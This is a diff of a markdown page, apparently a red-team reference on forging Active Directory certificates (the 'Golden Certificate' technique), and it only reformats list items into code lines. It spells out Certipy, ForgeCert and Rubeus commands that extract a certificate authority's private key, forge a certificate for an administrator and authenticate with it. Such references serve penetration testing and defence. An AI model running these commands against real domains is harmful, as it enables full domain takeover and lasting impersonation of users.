@@ -20,17 +20,17 @@
 
 ### The certificate and private key can also be obtained using Certipy with the following command:
 
- - certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
+    certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
 
 ### Upon acquiring the CA certificate and its private key in .pfx format, tools like ForgeCert can be utilized to generate valid certificates:
 
- - ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123! (Generating a new certificate with ForgeCert)
+    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123! (Generating a new certificate with ForgeCert)
 
- - certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL' (Generating a new certificate with certipy
+    certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL' (Generating a new certificate with certipy
 
- - Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123! (Authenticating using the new certificate with Rubeus)
+    Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123! (Authenticating using the new certificate with Rubeus)
 
- - certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128 (Authenticating using the new certificate with certipy)
+    certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128 (Authenticating using the new certificate with certipy)
 
 ## TIP: The user targeted for certificate forgery must be active and capable of authenticating in Active Directory for the process to succeed. Forging a certificate for special accounts like krbtgt is ineffective.
 
